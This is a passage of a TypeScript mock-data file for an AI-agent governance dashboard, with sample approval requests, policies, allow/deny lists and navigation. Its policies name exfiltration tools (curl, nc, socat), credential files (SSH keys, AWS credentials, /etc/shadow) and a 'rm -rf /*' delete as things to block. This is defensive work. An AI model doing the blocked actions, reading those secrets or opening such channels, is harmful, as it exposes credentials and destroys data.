    id: 'apr-1035', title: 'Force-push after rebase', agentType: 'claude-code', user: 'jane.doe', endpoint: 'ep-jane-mbp', env: 'production', sessionId: 'ses_7f3a9c21',
    action: { class: 'exec', tool: 'Bash', command: 'git push --force-with-lease origin main', binary: '/usr/bin/git' },
    fingerprint: 'fp1:58c0e3a9d14b7f26', policyId: 'pol-prod', ruleId: 'r-prod-4', risk: 'medium',
    reason: 'Force pushes to protected branches require approval',
    requestedAgo: '1 h ago', expiresIn: '—', state: 'approved', decidedBy: 'Lena Kim', decidedAgo: '1 h ago', note: 'Rebase onto hotfix — confirmed with Jane.',
  },
  {
    id: 'apr-1034', title: 'Drop archive table', agentType: 'codex', user: 'raj.patel', endpoint: 'ep-raj-ws', env: 'staging', sessionId: 'ses_19a7cc4e',
    action: { class: 'mcp_call', tool: 'mcp__postgres__query', mcpServer: 'postgres', mcpTool: 'query' },
    fingerprint: 'fp1:c3f9a10e2b84d675', policyId: 'pol-mcp', ruleId: 'r-mcp-3', risk: 'high',
    reason: 'postgres writes require approval',
    requestedAgo: '2 h ago', expiresIn: '—', state: 'approval_denied', decidedBy: 'Omar Haddad', decidedAgo: '2 h ago', note: 'Archive still referenced by reporting jobs.',
  },
  {
    id: 'apr-1033', title: 'Read production logs', agentType: 'codex', user: 'omar.haddad', endpoint: 'ep-bastion-01', env: 'production', sessionId: 'ses_e0b3d915',
    action: { class: 'exec', tool: 'shell', command: 'kubectl logs deploy/payments -n prod --since=1h', binary: '/usr/local/bin/kubectl' },
    fingerprint: 'fp1:9e61b2f8a05c7d34', policyId: 'pol-prod', ruleId: 'r-prod-6', risk: 'low',
    reason: 'kubectl against prod-eu-1 requires approval',
    requestedAgo: '3 h ago', expiresIn: '—', state: 'approved', decidedBy: 'Tom Weiss', decidedAgo: '3 h ago',
  },
  {
    id: 'apr-1032', title: 'Install pip package', agentType: 'aider', user: 'dan.cohen', endpoint: 'ep-dan-vm', env: 'development', sessionId: 'ses_3d77a0b2',
    action: { class: 'exec', tool: 'shell', command: 'pip install requests-toolbelt', binary: '/usr/bin/pip' },
    fingerprint: 'fp1:12ab9f6e0c43d8a7', policyId: 'pol-contractors', ruleId: 'r-c-1', risk: 'medium',
    reason: 'Contractor endpoints require approval for package installs',
    requestedAgo: '5 h ago', expiresIn: '—', state: 'expired',
  },
];

export const POLICIES: Policy[] = [
  {
    id: 'pol-global', name: 'Global Policy', status: 'active', mode: 'denylist', priority: 100,
    description: 'Baseline for every agent on every endpoint: no raw network tools, no credential reads, alert on sensitive files.',
    scope: { envs: [], agentTypes: [], users: [] }, version: 42, updatedAgo: '18 min ago', updatedBy: 'lena.kim', endpoints: 13,
    rules: [
      { id: 'r-g-1', class: 'exec', match: '/usr/bin/curl', effect: 'deny', description: 'No raw HTTP clients — use the fetch tool', hits24h: 9 },
      { id: 'r-g-2', class: 'exec', match: '/usr/bin/wget', effect: 'deny', description: 'No raw HTTP clients', hits24h: 2 },
      { id: 'r-g-3', class: 'exec', match: '/usr/bin/nc', effect: 'deny', description: 'Netcat is an exfiltration channel', hits24h: 1 },
      { id: 'r-g-4', class: 'exec', match: '/usr/bin/socat', effect: 'deny', description: 'Raw socket relays', hits24h: 0 },
      { id: 'r-g-5', class: 'file_read', match: '*/.ssh/id_*', effect: 'deny', description: 'Private SSH keys', hits24h: 1 },
      { id: 'r-g-6', class: 'file_read', match: '*/.aws/credentials', effect: 'deny', description: 'AWS credentials', hits24h: 1 },
      { id: 'r-g-7', class: 'file_read', match: '*/.env*', effect: 'alert', description: 'dotenv files — alert, do not block', hits24h: 14 },
      { id: 'r-g-8', class: 'file_read', match: '/etc/shadow', effect: 'deny', description: 'System password hashes', hits24h: 0 },
      { id: 'r-g-9', class: 'network', match: '*.githubusercontent.com, pastebin.com', effect: 'require_approval', description: 'Scripts from paste/gist hosts', hits24h: 1 },
      { id: 'r-g-10', class: 'network', match: '*:*', effect: 'alert', description: 'Report every outbound TCP connect', hits24h: 1204 },
      { id: 'r-g-11', class: 'exec', match: '*', effect: 'allow', description: 'Everything else runs (denylist mode)', hits24h: 3876 },
      { id: 'r-g-12', class: 'tool_call', match: 'Bash(rm -rf /*)', effect: 'deny', description: 'Catastrophic deletes (hook-level)', hits24h: 0 },
    ],
  },
  {
    id: 'pol-prod', name: 'Production Guardrails', status: 'active', mode: 'allowlist', priority: 200,
    description: 'Endpoints with production access: allowlisted binaries only; risky changes go to a human approver.',
    scope: { envs: ['production'], agentTypes: [], users: [] }, version: 17, updatedAgo: '2 h ago', updatedBy: 'omar.haddad', endpoints: 5,
    rules: [
      { id: 'r-prod-1', class: 'exec', match: 'exec_allow (38 binaries)', effect: 'allow', description: 'git, node, npm, go, kubectl, helm, terraform, …', hits24h: 2210 },
      { id: 'r-prod-2', class: 'exec', match: 'npm install *, pip install *', effect: 'require_approval', description: 'Supply-chain guard on new packages', hits24h: 3 },
      { id: 'r-prod-3', class: 'file_write', match: '!${workspace}/**', effect: 'require_approval', description: 'Writes outside the project workspace', hits24h: 2 },
      { id: 'r-prod-4', class: 'exec', match: 'git push --force*', effect: 'require_approval', description: 'Force pushes to protected branches', hits24h: 2 },
      { id: 'r-prod-5', class: 'exec', match: 'terraform apply*', effect: 'require_approval', description: 'Infrastructure changes', hits24h: 1 },
      { id: 'r-prod-6', class: 'exec', match: 'kubectl * -n prod*', effect: 'require_approval', description: 'kubectl against prod namespaces', hits24h: 4 },
      { id: 'r-prod-7', class: 'exec', match: 'kubectl delete*', effect: 'deny', description: 'No destructive kubectl from agents', hits24h: 4 },
    ],
  },
  {
    id: 'pol-secrets', name: 'Secrets & Credentials', status: 'active', mode: 'denylist', priority: 150,
    description: 'Kernel-enforced file_deny for credential stores; dotenv files alert in every mode.',
    scope: { envs: [], agentTypes: [], users: [] }, version: 9, updatedAgo: '1 d ago', updatedBy: 'lena.kim', endpoints: 13,
    rules: [
      { id: 'r-s-1', class: 'file_read', match: '/.aws/credentials', effect: 'deny', description: 'file_deny', hits24h: 1 },
      { id: 'r-s-2', class: 'file_read', match: '/.ssh/id_ed25519, /.ssh/id_rsa, /.ssh/id_ecdsa', effect: 'deny', description: 'file_deny', hits24h: 1 },
      { id: 'r-s-3', class: 'file_read', match: '/.kube/config', effect: 'alert', description: 'file_alert', hits24h: 6 },
      { id: 'r-s-4', class: 'file_read', match: '/.env.production', effect: 'alert', description: 'file_alert', hits24h: 3 },
      { id: 'r-s-5', class: 'file_read', match: '/.npmrc, /.pypirc, /.netrc, /.git-credentials', effect: 'alert', description: 'file_alert', hits24h: 2 },
    ],
  },
  {
    id: 'pol-mcp', name: 'MCP Server Governance', status: 'active', mode: 'denylist', priority: 180,
    description: 'What agents may do through MCP servers (github, postgres, slack, kubernetes).',
    scope: { envs: [], agentTypes: [], users: [] }, version: 6, updatedAgo: '3 h ago', updatedBy: 'jane.doe', endpoints: 13,
    rules: [
      { id: 'r-mcp-1', class: 'mcp_call', match: 'github.get_*, github.list_*, github.search_*', effect: 'allow', description: 'Read-only GitHub', hits24h: 412 },
      { id: 'r-mcp-2', class: 'mcp_call', match: 'github.delete_*', effect: 'deny', description: 'Destructive GitHub tools', hits24h: 1 },
      { id: 'r-mcp-3', class: 'mcp_call', match: 'postgres.query (write)', effect: 'require_approval', description: 'Any non-SELECT statement', hits24h: 2 },
      { id: 'r-mcp-4', class: 'mcp_call', match: 'slack.post_message #agents-*', effect: 'allow', description: 'Agent status channels', hits24h: 9 },
      { id: 'r-mcp-5', class: 'mcp_call', match: 'slack.post_message *', effect: 'require_approval', description: 'Any other channel', hits24h: 1 },
    ],
  },
  {
    id: 'pol-dev-learn', name: 'Development — Learn', status: 'active', mode: 'learn', priority: 50,
    description: 'Development endpoints record every binary agents run, to seed per-team allowlists.',
    scope: { envs: ['development'], agentTypes: [], users: [] }, version: 3, updatedAgo: '4 d ago', updatedBy: 'sarah.lee', endpoints: 4,
    rules: [
      { id: 'r-l-1', class: 'exec', match: '*', effect: 'alert', description: 'Record (GET /learned)', hits24h: 611 },
    ],
  },
  {
    id: 'pol-contractors', name: 'Contractor Restrictions', status: 'draft', mode: 'allowlist', priority: 250,
    description: 'Tighter defaults for contractor endpoints — no package installs or pushes without approval.',
    scope: { envs: [], agentTypes: [], users: ['dan.cohen'] }, version: 1, updatedAgo: '5 h ago', updatedBy: 'lena.kim', endpoints: 1,
    rules: [
      { id: 'r-c-1', class: 'exec', match: 'pip install *, npm install *', effect: 'require_approval', description: 'Package installs', hits24h: 0 },
      { id: 'r-c-2', class: 'exec', match: 'git push*', effect: 'require_approval', description: 'Any push', hits24h: 0 },
      { id: 'r-c-3', class: 'network', match: '*', effect: 'alert', description: 'All egress', hits24h: 0 },
    ],
  },
];

// [list, kind, value, scope, note, addedBy, addedAgo, hits24h]
type ListRow = [ListEntry['list'], ListEntry['kind'], string, string, string, string, string, number];
const LIST_ROWS: ListRow[] = [
  ['allow', 'exec', '/usr/bin/git', 'Global', 'Version control', 'lena.kim', '12 d ago', 1840],
  ['allow', 'exec', '/usr/local/bin/node', 'Global', 'JS runtime', 'lena.kim', '12 d ago', 1222],
  ['allow', 'exec', '/usr/local/bin/npm', 'Global', 'Installs still need approval in Production', 'lena.kim', '12 d ago', 344],
  ['allow', 'exec', '/usr/local/go/bin/go', 'Global', 'Go toolchain', 'sarah.lee', '9 d ago', 201],
  ['allow', 'exec', '/usr/local/bin/kubectl', 'Production', 'Read verbs; deletes are denied by policy', 'omar.haddad', '6 d ago', 88],
  ['allow', 'exec', '/usr/local/bin/helm', 'Production', 'Added from learn-mode results', 'omar.haddad', '2 h ago', 3],
  ['allow', 'exec', '/usr/local/bin/terraform', 'Production', 'apply requires approval', 'tom.weiss', '6 d ago', 12],
  ['allow', 'network', 'api.github.com:443', 'Global', 'GitHub API', 'jane.doe', '20 d ago', 960],
  ['allow', 'network', 'registry.npmjs.org:443', 'Global', 'Package registry', 'jane.doe', '20 d ago', 151],
  ['allow', 'network', 'api.anthropic.com:443', 'Global', 'Model provider', 'lena.kim', '20 d ago', 4410],
  ['allow', 'mcp', 'github', 'Global', 'Read tools only (see MCP Server Governance)', 'jane.doe', '8 d ago', 412],
  ['allow', 'file', '${workspace}/**', 'Global', 'The project the agent was started in', 'lena.kim', '20 d ago', 9032],
  ['deny', 'exec', '/usr/bin/curl', 'Global', 'Use the agent fetch tool instead', 'lena.kim', '20 d ago', 9],
  ['deny', 'exec', '/usr/bin/nc', 'Global', 'Exfiltration channel', 'lena.kim', '20 d ago', 1],
  ['deny', 'network', 'pastebin.com', 'Global', 'Paste sites', 'lena.kim', '14 d ago', 2],
  ['deny', 'file', '/etc/shadow', 'Global', 'Kernel file_deny', 'lena.kim', '20 d ago', 0],
  ['deny', 'mcp', 'github.delete_*', 'Global', 'Destructive repository tools', 'jane.doe', '8 d ago', 1],
];
export const LIST_ENTRIES: ListEntry[] = LIST_ROWS.map(([list, kind, value, scope, note, addedBy, addedAgo, hits24h], i) => ({
  id: `le-${i + 1}`, list, kind, value, scope, note, addedBy, addedAgo, hits24h,
}));

/** The sidebar: sections in the order an admin works, each item with a one-line
 *  hint (its tooltip) that says what you do there. */
export const navSections: { title: string; soon?: boolean; items: { href: string; label: string; icon: string; hint: string }[] }[] = [
  { title: 'Monitor', items: [
    { href: '/', label: 'Overview', icon: 'home', hint: 'Status at a glance, and your next setup step' },
    { href: '/graph', label: 'Agent Graph', icon: 'network', hint: 'What each agent ran, opened and reached — grouped by risk' },
    { href: '/audit', label: 'Activity & Audit', icon: 'clipboard', hint: 'Every agent event and every admin change, exportable' },
  ] },
  { title: 'Control', items: [
    { href: '/policies', label: 'Policies', icon: 'shield', hint: 'Decide what agents may do: rules, exceptions, AI help' },
    { href: '/approvals', label: 'Approvals', icon: 'shieldCheck', hint: 'Approve or deny actions agents paused for' },
  ] },
  { title: 'Machines', items: [
    { href: '/enforcement', label: 'Machines', icon: 'laptop', hint: 'Install Effigent on laptops and servers, see their status' },
  ] },
  { title: 'Workspace', items: [
    { href: '/team', label: 'Team & Approvers', icon: 'users', hint: 'Who is in the workspace and who decides which approvals' },
    { href: '/settings', label: 'Settings', icon: 'gear', hint: 'Slack & email, API keys & webhooks, your role' },
  ] },
  { title: 'Coming soon', soon: true, items: [
    { href: '/lists', label: 'Shared lists', icon: 'listCheck', hint: 'Org-wide lists every policy can reference (preview)' },
    { href: '/identity', label: 'People', icon: 'idcard', hint: 'Who is behind each agent (preview)' },
  ] },
];
export const nav = navSections.flatMap((s) => s.items);

export const ACTION_CLASS_LABEL: Record<string, string> = {
  exec: 'Exec', file_read: 'File read', file_write: 'File write', network: 'Network', mcp_call: 'MCP call', tool_call: 'Tool call',
};
